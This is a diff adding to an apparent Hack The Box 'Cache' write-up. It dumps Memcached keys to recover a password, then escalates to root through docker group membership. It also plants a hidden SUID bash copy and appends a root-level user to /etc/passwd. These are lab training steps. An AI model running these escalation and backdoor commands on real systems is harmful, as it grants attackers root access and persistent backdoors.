@@ -250,6 +250,8 @@ memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
 mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
+<b>user.txt</b>
+
 We know that his password was once found within the `client-side` JavaScript. After spawning a TTY shell, we can now change the user context to `ash` and read the `user.txt` file.
 
 ```console
@@ -264,7 +266,190 @@ id
 uid=1000(ash) gid=1000(ash) groups=1000(ash)
 ash@cache:~$ cat user.txt
 cat user.txt
-62d492ad4164d22a52ce600d22b2c6f2
+62d<REDACTED>6f2
 ```
 
+### ash --> luffy (Memcached)
 
+Further enumeration identified that the Memcached service was running on the `localhost:11211`. 
+
+![image](/assets/img/post/htb/cache/15_mem.png)
+
+> **NOTE**: Memcached is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.
+
+
+Using the `stats slabs` command, we can see the list of the Memcached information.
+
+```console
+ash@cache:~$ telnet 127.0.0.1 11211
+telnet 127.0.0.1 11211
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+stats slabs
+stats slabs
+STAT 1:chunk_size 96
+STAT 1:chunks_per_page 10922
+STAT 1:total_pages 1
+STAT 1:total_chunks 10922
+STAT 1:used_chunks 5
+STAT 1:free_chunks 10917
+STAT 1:free_chunks_end 0
+STAT 1:mem_requested 371
+STAT 1:get_hits 0
+STAT 1:cmd_set 2240
+STAT 1:delete_hits 0
+STAT 1:incr_hits 0
+STAT 1:decr_hits 0
+STAT 1:cas_hits 0
+STAT 1:cas_badval 0
+STAT 1:touch_hits 0
+STAT active_slabs 1
+STAT total_malloced 1048576
+END
+```
+
+We will be interested in the store keys. Using the `stats cachedump 1 0`, we can retrieve them. 
+
+> **NOTE**: 1 = Slab ID. 0 = It represents the number of keys you want to dump, 0 will dump all the keys present in the slab ID respectively.
+
+```console
+stats cachedump 1 0
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+```
+
+We can now use the `get` command to fetch the information in plaintext.
+
+```console
+get link
+VALUE link 0 21
+https://hackthebox.eu
+END
+
+get user
+VALUE user 0 5
+luffy
+END
+
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+
+get file
+VALUE file 0 7
+nothing
+END
+
+get account
+VALUE account 0 9
+afhj556uo
+```
+
+And now we can change our user context to `luffy` from `ash`.
+
+```console
+ash@cache:~$ su -l luffy
+su -l luffy
+Password: 0n3_p1ec3
+
+luffy@cache:~$ id
+id
+uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
+```
+
+### luffy --> root (Docker)
+
+<b>root.txt</b>
+
+From the above `id`, we can see that the user `luffy` is a part of the `docker` group. By running the command `docker images`, we can also see there is an already installed `ubuntu` image. 
+
+By mounting to the `/root` directory + using `-it` flag to use the shell mode, we can now read the `root.txt` flag chaning directory into `/mnt`.
+
+```console
+luffy@cache:~$ id
+id
+uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
+
+luffy@cache:~$ docker images
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              2ca708c1c9cc        13 months ago       64.2MB
+
+luffy@cache:~$ docker run -v /root:/mnt -it ubuntu
+docker run -v /root:/mnt -it ubuntu
+root@4d8f1abf4b10:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@4d8f1abf4b10:/# ls
+ls
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+
+root@4d8f1abf4b10:/# cd /mnt
+cd /mnt
+
+root@4d8f1abf4b10:/mnt# ls
+ls
+root.txt
+
+root@4d8f1abf4b10:/mnt# cat root.txt
+cat root.txt
+e85<REDACTED>148
+```
+
+<b>Root Shell</b>
+
+From the docker file system access, there are multiple ways to gain root shell. 
+
+1) Creating a SUID copy of `/bin/bash`
+
+```bash
+# Mounting the `/` directory to `/mnt`
+luffy@cache:~$ docker run -v /:/mnt -it ubuntu
+
+# Copying the `/bin/bash` into luffy's home directory
+root@df6dec947625:/mnt# cp bin/bash home/luffy/.local/.bigb0ss
+
+root@df6dec947625:/mnt# ls -ls home/luffy/.local/.bigb0ss
+ls -ls home/luffy/.local/.bigb0ss
+1088 -rwxr-xr-x 1 root root 1113504 Oct 26 04:04 home/luffy/.local/.bigb0ss
+
+# Configuring SUID to .bigb0ss
+root@df6dec947625:/mnt# chmod 4777 home/luffy/.local/.bigb0ss
+
+root@df6dec947625:/mnt# ls -ls home/luffy/.local/.bigb0ss
+ls -ls home/luffy/.local/.bigb0ss
+1088 -rwsrwxrwx 1 root root 1113504 Oct 26 04:04 home/luffy/.local/.bigb0ss
+
+root@df6dec947625:/mnt# exit
+exit
+
+# Executing the .bigb0ss and gaining the root shell
+luffy@cache:~$ .local/.bigb0ss -p
+.local/.bigb0ss -p
+.bigb0ss-4.4# id
+id
+uid=1001(luffy) gid=1001(luffy) euid=0(root) groups=1001(luffy),999(docker)
+.bigb0ss-4.4# cat /root/root.txt
+cat /root/root.txt
+e85<REDACTED>148
+```
+
+2) Adding New User as root
+
+First, in our Kali box, we need to generate password salt 
+
+```console
+$ openssl passwd -1 -salt bigb0ss
+Password: 
+$1$bigb0ss$BpDTAY12U2HOLINndbdWk/
+```
+
+echo 'bigb0ss:$1$bigb0ss$BpDTAY12U2HOLINndbdWk/:0:0::/root:/bin/bash' >> etc/passwd
